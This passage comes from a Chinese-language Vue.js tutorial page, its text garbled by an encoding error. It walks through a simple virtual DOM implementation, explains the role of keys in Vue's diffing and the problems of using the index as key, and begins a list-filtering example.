class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-javascript">         * Element virdual-dom å¯¹è±¡å®šä¹‰</span></span><br><span class="hljs-comment"><span class="language-javascript">         * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">String</span>&#125; <span class="hljs-variable">tagName</span> - dom å…ƒç´ åç§°</span></span><br><span class="hljs-comment"><span class="language-javascript">         * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">Object</span>&#125; <span class="hljs-variable">props</span> - dom å±æ€§</span></span><br><span class="hljs-comment"><span class="language-javascript">         * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">Array&lt;Element|String&gt;</span>&#125; - å­èŠ‚ç‚¹</span></span><br><span class="hljs-comment"><span class="language-javascript">         */</span></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Element</span>(<span class="hljs-params">tagName, props, children</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">tagName</span> = tagName;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span> = props;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> = children;</span><br><span class="language-javascript">        <span class="hljs-comment">// dom å…ƒç´ çš„ key å€¼ï¼Œç”¨ä½œå”¯ä¸€æ ‡è¯†ç¬¦</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (props.<span class="hljs-property">key</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span> = props.<span class="hljs-property">key</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">el</span>(<span class="hljs-params">tagName, props, children</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Element</span>(tagName, props, children);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> ul = <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;div&#x27;</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;Virtual DOM&#x27;</span> &#125;, [</span><br><span class="language-javascript">        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;p&#x27;</span>, &#123;&#125;, [<span class="hljs-string">&#x27;Virtual DOM&#x27;</span>]),</span><br><span class="language-javascript">        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;ul&#x27;</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;list&#x27;</span> &#125;, [</span><br><span class="language-javascript">            <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 1&#x27;</span>]),</span><br><span class="language-javascript">            <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 2&#x27;</span>]),</span><br><span class="language-javascript">            <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 3&#x27;</span>])</span><br><span class="language-javascript">        ]),</span><br><span class="language-javascript">        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;&#125;, [<span class="hljs-string">&#x27;Hello, World&#x27;</span>])</span><br><span class="language-javascript">    ])</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-javascript">             * render å°†virdual-dom å¯¹è±¡æ¸²æŸ“ä¸ºå®é™… DOM å…ƒç´ </span></span><br><span class="hljs-comment"><span class="language-javascript">             */</span></span><br><span class="language-javascript">    <span class="hljs-title class_">Element</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// åˆ›å»ºèŠ‚ç‚¹</span></span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">tagName</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> props = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>;</span><br><span class="language-javascript">        <span class="hljs-comment">// è®¾ç½®èŠ‚ç‚¹çš„ DOM å±æ€§</span></span><br><span class="language-javascript">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> propName <span class="hljs-keyword">in</span> props) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> propValue = props[propName];</span><br><span class="language-javascript">            el.<span class="hljs-title function_">setAttribute</span>(propName, propValue)</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> children = <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> || []</span><br><span class="language-javascript">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> child <span class="hljs-keyword">of</span> children) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> childEl = (child <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Element</span>)</span><br><span class="language-javascript">            ? child.<span class="hljs-title function_">render</span>() <span class="hljs-comment">// å¦‚æœå­èŠ‚ç‚¹ä¹Ÿæ˜¯è™šæ‹Ÿ DOM, é€’å½’æ„å»º DOM èŠ‚ç‚¹</span></span><br><span class="language-javascript">            : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(child) <span class="hljs-comment">// å¦‚æœæ˜¯æ–‡æœ¬ï¼Œå°±æ„å»ºæ–‡æœ¬èŠ‚ç‚¹</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">            el.<span class="hljs-title function_">appendChild</span>(childEl);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> el;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> ulRoot = ul.<span class="hljs-title function_">render</span>();</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(ulRoot);</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ul);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è™šæ‹ŸDOMä¸­keyçš„ä½œç”¨"><a href="#è™šæ‹ŸDOMä¸­keyçš„ä½œç”¨" class="headerlink" title="è™šæ‹ŸDOMä¸­keyçš„ä½œç”¨"></a><strong>è™šæ‹ŸDOMä¸­keyçš„ä½œç”¨</strong></h4><p>keyæ˜¯è™šæ‹ŸDOMå¯¹è±¡çš„æ ‡è¯†ï¼Œå½“æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼ŒVueä¼šæ ¹æ®ã€æ–°æ•°æ®ã€‘ç”Ÿæˆã€æ–°çš„è™šæ‹ŸDOMã€‘,<br>éšåVueè¿›è¡Œã€æ–°è™šæ‹ŸDOMã€‘ä¸ã€æ—§è™šæ‹ŸDOMã€‘çš„å·®å¼‚æ¯”è¾ƒï¼Œæ¯”è¾ƒè§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>æ—§è™šæ‹ŸDOMä¸­æ‰¾åˆ°äº†ä¸æ–°è™šæ‹ŸDOMç›¸åŒçš„keyï¼š<ul><li>â‘ .è‹¥è™šæ‹ŸDOMä¸­å†…å®¹æ²¡å˜, ç›´æ¥ä½¿ç”¨ä¹‹å‰çš„çœŸå®DOMï¼</li><li>â‘¡.è‹¥è™šæ‹ŸDOMä¸­å†…å®¹å˜äº†, åˆ™ç”Ÿæˆæ–°çš„çœŸå®DOMï¼Œéšåæ›¿æ¢æ‰é¡µé¢ä¸­ä¹‹å‰çš„çœŸå®DOMã€‚</li></ul></li><li>æ—§è™šæ‹ŸDOMä¸­æœªæ‰¾åˆ°ä¸æ–°è™šæ‹ŸDOMç›¸åŒçš„key <ul><li>åˆ›å»ºæ–°çš„çœŸå®DOMï¼Œéšåæ¸²æŸ“åˆ°åˆ°é¡µé¢ã€‚</li></ul></li></ul><blockquote><p>å¥½äº†ï¼Œæˆ‘ä»¬çŸ¥é“äº†æœ€ç®€å•çš„keyçš„åŸç†ï¼Œå¦‚æœè¦ç»§ç»­ç ”ç©¶ä¸‹å»å°±è¦æ¶‰åŠåˆ°vueçš„æ ¸å¿ƒä¹‹ä¸€-Diffç®—æ³•ï¼Œåé¢ä¼šè¯¦ç»†ä»‹ç»ã€‚</p></blockquote><h3 id="ç”¨indexä½œä¸ºkeyå¯èƒ½ä¼šå¼•å‘çš„é—®é¢˜ï¼š"><a href="#ç”¨indexä½œä¸ºkeyå¯èƒ½ä¼šå¼•å‘çš„é—®é¢˜ï¼š" class="headerlink" title="ç”¨indexä½œä¸ºkeyå¯èƒ½ä¼šå¼•å‘çš„é—®é¢˜ï¼š"></a>ç”¨indexä½œä¸ºkeyå¯èƒ½ä¼šå¼•å‘çš„é—®é¢˜ï¼š</h3><p><strong>è‹¥å¯¹æ•°æ®è¿›è¡Œ ï¼šé€†åºæ·»åŠ ã€é€†åºåˆ é™¤ç­‰ç ´åé¡ºåºæ“ä½œï¼š</strong></p><p>ä¼šäº§ç”Ÿæ²¡æœ‰å¿…è¦çš„çœŸå®DOMæ›´æ–° &#x3D;&#x3D;&gt; ç•Œé¢æ•ˆæœæ²¡é—®é¢˜, ä½†æ•ˆç‡ä½ã€‚</p><blockquote><p>æ¡ˆä¾‹</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- éå†æ•°ç»„ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>äººå‘˜åˆ—è¡¨ï¼ˆéå†æ•°ç»„ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click.once</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>æ·»åŠ ä¸€ä¸ªè€åˆ˜<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of persons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br>            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;<br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-attr">persons</span>: [</span><br><span class="language-javascript">&#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;001&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> &#125;,</span><br><span class="language-javascript">&#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;002&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;æå››&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span> &#125;,</span><br><span class="language-javascript">&#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;003&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;ç‹äº”&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> &#125;</span><br><span class="language-javascript">]</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">add</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> p = &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;004&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;è€åˆ˜&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">40</span> &#125;</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">unshift</span>(p)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è§£é‡Šï¼š</p></blockquote><p>åˆå§‹æ•°æ®</p><p>persons: [  </p><p>{ id: â€˜001â€™, name: â€˜å¼ ä¸‰â€™, age: 18 },  </p><p>{ id: â€˜002â€™, name: â€˜æå››â€™, age: 19 },  </p><p>{ id: â€˜003â€™, name: â€˜ç‹äº”â€™, age: 20 }  </p><p>]</p><p><strong>vueæ ¹æ®æ•°æ®ç”Ÿæˆè™šæ‹Ÿ DOM</strong></p><p>åˆå§‹è™šæ‹Ÿ DOM</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;0&#x27;</span>&gt;</span>å¼ ä¸‰-18<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span>æå››-19<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;2&#x27;</span>&gt;</span>ç‹äº”-20<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>å°†è™šæ‹Ÿ DOM è½¬ä¸º çœŸå® DOM</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114010268.png" alt="image-20221124114010268"></p><p><code>this.persons.unshift(&#123; id: &#39;004&#39;, name: &#39;è€åˆ˜&#39;, age: 40 &#125;)</code></p><p>åœ¨ persons æ•°ç»„æœ€å‰é¢æ·»åŠ ä¸Š { id: â€˜004â€™, name: â€˜è€åˆ˜â€™, age: 40 }</p><p>æ–°æ•°æ®ï¼š</p><p>persons: [</p><p> { id: â€˜004â€™, name: â€˜è€åˆ˜â€™, age: 40 },</p><p> { id: â€˜001â€™, name: â€˜å¼ ä¸‰â€™, age: 18 },  </p><p> { id: â€˜002â€™, name: â€˜æå››â€™, age: 19 },  </p><p> { id: â€˜003â€™, name: â€˜ç‹äº”â€™, age: 20 }  </p><p>]</p><p><strong>vueæ ¹æ®æ•°æ®ç”Ÿæˆè™šæ‹Ÿ DOM</strong></p><p>æ–°è™šæ‹Ÿ DOM</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;0&#x27;</span>&gt;</span>è€åˆ˜-30<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span>å¼ ä¸‰-18<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;3&#x27;</span>&gt;</span>æå››-19<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;4&#x27;</span>&gt;</span>ç‹äº”-20<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>å°†è™šæ‹Ÿ DOM è½¬ä¸º çœŸå® DOM</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114120362.png" alt="image-20221124114120362"></p><p>å› ä¸ºè€åˆ˜è¢«æ’åˆ°ç¬¬ä¸€ä¸ªï¼Œé‡åˆ·äº† key çš„å€¼ï¼Œvue Diff ç®—æ³• æ ¹æ® key çš„å€¼ åˆ¤æ–­ è™šæ‹ŸDOM å…¨éƒ¨å‘ç”Ÿäº†æ”¹å˜ï¼Œç„¶åå…¨éƒ¨é‡æ–°ç”Ÿæˆæ–°çš„ çœŸå®<br>DOMã€‚å®é™…ä¸Šï¼Œå¼ ä¸‰ï¼Œæå››ï¼Œç‹äº”å¹¶æ²¡æœ‰å‘ç”Ÿæ›´æ”¹ï¼Œæ˜¯å¯ä»¥ç›´æ¥å¤ç”¨ä¹‹å‰çš„çœŸå® DOMï¼Œè€Œå› ä¸º key çš„é”™ä¹±ï¼Œå¯¼è‡´è¦å…¨éƒ¨é‡æ–°ç”Ÿæˆï¼Œé€ æˆäº†æ€§èƒ½çš„æµªè´¹ã€‚</p><blockquote><p>æ¥å¼ å°šç¡…è°·çš„å›¾</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ec80a7ae139642d09d70e77ca37e0a52.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>å¦‚æœç»“æ„ä¸­è¿˜åŒ…å«è¾“å…¥ç±»çš„DOM ï¼š</strong></p><p>ä¼šäº§ç”Ÿé”™è¯¯DOMæ›´æ–° &#x3D;&#x3D;&gt; ç•Œé¢æœ‰é—®é¢˜ã€‚</p><blockquote><p>è¿™å›é€ æˆçš„å°±ä¸æ˜¯æ€§èƒ½æµªè´¹äº†ï¼Œä¼šç›´æ¥å¯¼è‡´é¡µé¢çš„é”™è¯¯</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114210283.png" alt="image-20221124114210283"></p><h3 id="ç»“è®ºï¼š"><a href="#ç»“è®ºï¼š" class="headerlink" title="ç»“è®ºï¼š"></a>ç»“è®ºï¼š</h3><ul><li>æœ€å¥½ä½¿ç”¨æ¯æ¡æ•°æ®çš„å”¯ä¸€æ ‡è¯†ä½œä¸ºkey, æ¯”å¦‚idã€æ‰‹æœºå·ã€èº«ä»½è¯å·ã€å­¦å·ç­‰å”¯ä¸€å€¼</li><li>å¦‚æœä¸å­˜åœ¨å¯¹æ•°æ®çš„é€†åºæ·»åŠ ã€é€†åºåˆ é™¤ç­‰ç ´åé¡ºåºæ“ä½œï¼Œä»…ç”¨äºæ¸²æŸ“åˆ—è¡¨ç”¨äºå±•ç¤ºï¼Œä½¿ç”¨indexä½œä¸ºkeyæ˜¯æ²¡æœ‰é—®é¢˜çš„</li></ul><blockquote><p>æ¥å¼ å°šç¡…è°·çš„å›¾ï¼Œæ­£ç»ä½¿ç”¨ key</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e5b3f8a66d7441e5bcff0a2525266759.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="åˆ—è¡¨è¿‡æ»¤"><a href="#åˆ—è¡¨è¿‡æ»¤" class="headerlink" title="åˆ—è¡¨è¿‡æ»¤"></a>åˆ—è¡¨è¿‡æ»¤</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>åˆ—è¡¨è¿‡æ»¤<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>äººå‘˜åˆ—è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;è¯·è¾“å…¥åå­—&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;keyWord&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of filPersons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;p.id&quot;</span>&gt;</span><br>      &#123;&#123; p.name &#125;&#125;-&#123;&#123; p.age &#125;&#125;-&#123;&#123; p.sex &#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-comment">// ç”¨ watch å®ç°</span></span><br><span class="language-javascript">  <span class="hljs-comment">// #region </span></span><br><span class="language-javascript">  <span class="hljs-comment">/* new Vue(&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">el: &#x27;#root&#x27;,</span></span><br><span class="hljs-comment"><span class="language-javascript">data: &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">keyWord: &#x27;&#x27;,</span></span><br><span class="hljs-comment"><span class="language-javascript">persons: [</span></span><br><span class="hljs-comment"><span class="language-javascript">&#123; id: &#x27;001&#x27;, name: &#x27;é©¬å†¬æ¢…&#x27;, age: 19, sex: &#x27;å¥³&#x27; &#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">&#123; id: &#x27;002&#x27;, name: &#x27;å‘¨å†¬é›¨&#x27;, age: 20, sex: &#x27;å¥³&#x27; &#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">&#123; id: &#x27;003&#x27;, name: &#x27;å‘¨æ°ä¼¦&#x27;, age: 21, sex: &#x27;ç”·&#x27; &#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">&#123; id: &#x27;004&#x27;, name: &#x27;æ¸©å…†ä¼¦&#x27;, age: 22, sex: 